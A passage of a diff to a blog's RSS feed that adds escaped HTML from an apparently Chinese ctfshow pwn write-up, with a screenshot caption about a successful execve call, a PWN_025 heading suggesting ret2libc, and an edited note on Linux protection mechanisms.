+	height=&#34;304&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/67_hu_12ec48f01ef5c991.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/67_hu_825f43a0aef1cbbe.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;顺利完成execve系统调用，得以进行交互&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;281&#34;
+		data-flex-basis=&#34;675px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;大致思路知道就好，靶机的flag是动态变化的。&lt;/p&gt;
+&lt;h3 id=&#34;pwn_025&#34;&gt;PWN_025
+&lt;/h3&gt;&lt;p&gt;题目：开启NX保护，或许可以试试ret2libc&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_025&#34; &gt;PWN_025&lt;/a&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -2788,7 +3579,7 @@ elf文件的节（section）会被映射进内存中的段（segment），而这
     &lt;blockquote&gt;
 &lt;p&gt;理解了这个流程，就掌握了动态链接中最核心的 “懒绑定” 机制，这也是 CTFpwn 中 “&lt;strong&gt;PLT 劫持&lt;/strong&gt;” 等漏洞利用的基础。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
 &lt;h2 id=&#34;linux安全防护机制&#34;&gt;Linux安全防护机制
-&lt;/h2&gt;&lt;p&gt;栈溢出、指针悬挂、内存地址泄露等Bug会导致程序崩溃，一些攻击者会刻意制造这些漏洞来扰乱程序正常执行，这就是早期PWN的威力。&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;栈溢出、指针悬挂、内存地址泄露等Bug会导致程序崩溃，一些攻击者会刻意制造这些漏洞来扰乱程序正常执行，这就是早期PWN的威力。这一章比较重要，几乎贯穿后续栈溢出、堆的题目。&lt;/p&gt;
 &lt;h3 id=&#34;保护机制&#34;&gt;保护机制
 &lt;/h3&gt;&lt;blockquote class=&#34;alert alert-error&#34;&gt;
     &lt;blockquote&gt;
